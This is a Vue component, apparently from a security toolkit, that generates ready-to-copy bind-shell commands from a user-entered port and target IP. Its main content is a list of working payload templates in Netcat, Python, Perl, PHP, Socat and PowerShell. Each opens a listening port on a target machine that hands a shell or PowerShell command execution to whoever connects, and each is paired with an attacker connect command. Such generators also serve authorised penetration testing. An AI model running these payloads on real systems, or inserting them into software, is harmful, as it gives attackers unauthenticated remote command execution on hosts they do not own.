<template>
    <div v-row="'10-14'">
        <Align direction="vertical">
            <Display>
                <Align direction="vertical">
                    <!-- 目标监听端口 -->
                    <Input v-model="action.current.port" :label="$t('bindShell_port')" placeholder="4444" />
                    <!-- Shell 类型选择 -->
                    <Select
                        v-model="action.current.shellType"
                        :label="$t('bindShell_type')"
                        :options="shellOptions"
                    />
                </Align>
                <template #extra>
                    <Align>
                        <!-- 攻击端 IP 输入（用于生成连接命令） -->
                        <Input v-model="action.current.targetIp" :label="$t('bindShell_target_ip')" placeholder="10.10.10.1" />
                    </Align>
                </template>
            </Display>
        </Align>
        <HeightResize v-slot="{ height }">
            <div :style="{ height: height + 'px', overflowY: 'auto' }">
                <!-- 目标端命令 -->
                <div class="sectool-bind-section-title">{{ $t('bindShell_target_cmd') }}</div>
                <Textarea
                    :model-value="currentTargetCmd"
                    :height="52"
                    :placeholder="$t('bindShell_target_cmd')"
                    :copy="$t('bindShell_target_cmd')"
                />
                <!-- 攻击端连接命令 -->
                <div class="sectool-bind-section-title" style="margin-top: 10px">{{ $t('bindShell_attacker_cmd') }}</div>
                <Textarea
                    :model-value="currentAttackerCmd"
                    :height="42"
                    :placeholder="$t('bindShell_attacker_cmd')"
                    :copy="$t('bindShell_attacker_cmd')"
                />
            </div>
        </HeightResize>
    </div>
</template>

<script lang="ts" setup>
/**
 * Bind Shell 生成器
 * 与 Reverse Shell 相反：目标机监听端口，攻击者主动连接
 */
import { useAction, initialize } from "@/store/action"

// Bind Shell 模板定义：target=目标机执行，attacker=攻击者连接
const shells = [
    {
        id: "nc",
        name: "Netcat",
        target: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {{PORT}} >/tmp/f",
        attacker: "nc {{TARGET_IP}} {{PORT}}",
    },
    {
        id: "nc_e",
        name: "Netcat -e",
        target: "nc -lvp {{PORT}} -e /bin/sh",
        attacker: "nc {{TARGET_IP}} {{PORT}}",
    },
    {
        id: "python",
        name: "Python",
        target:
            "python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{{PORT}}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        attacker: "nc {{TARGET_IP}} {{PORT}}",
    },
    {
        id: "perl",
        name: "Perl",
        target:
            "perl -e 'use Socket;$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,1);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\")'",
        attacker: "nc {{TARGET_IP}} {{PORT}}",
    },
    {
        id: "php",
        name: "PHP",
        target:
            "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{{PORT}});socket_listen($s);$c=socket_accept($s);while(1){$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}'",
        attacker: "nc {{TARGET_IP}} {{PORT}}",
    },
    {
        id: "socat",
        name: "Socat",
        target: "socat TCP-LISTEN:{{PORT}},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        attacker: "socat FILE:`tty`,raw,echo=0 TCP:{{TARGET_IP}}:{{PORT}}",
    },
    {
        id: "powershell",
        name: "PowerShell",
        target:
            "$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any,{{PORT}});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()",
        attacker: "nc {{TARGET_IP}} {{PORT}}",
    },
]

const shellOptions = shells.map((s) => ({ value: s.id, label: s.name }))

const action = useAction(
    await initialize({
        port: "4444",
        shellType: "nc",
        targetIp: "10.10.10.1",
    })
)

// 替换模板占位符
const renderTemplate = (template: string, port: string, targetIp: string) =>
    template.replace(/\{\{PORT\}\}/g, port || "PORT").replace(/\{\{TARGET_IP\}\}/g, targetIp || "TARGET_IP")

const currentShell = $computed(() => shells.find((s) => s.id === action.current.shellType) || shells[0])
const currentTargetCmd = $computed(() =>
    renderTemplate(currentShell.target, action.current.port, action.current.targetIp)
)
const currentAttackerCmd = $computed(() =>
    renderTemplate(currentShell.attacker, action.current.port, action.current.targetIp)
)
</script>

<style scoped>
.sectool-bind-section-title {
    font-size: 12px;
    font-weight: 600;
    color: var(--sectool-text-secondary);
    margin: 6px 0 4px 2px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}
</style>
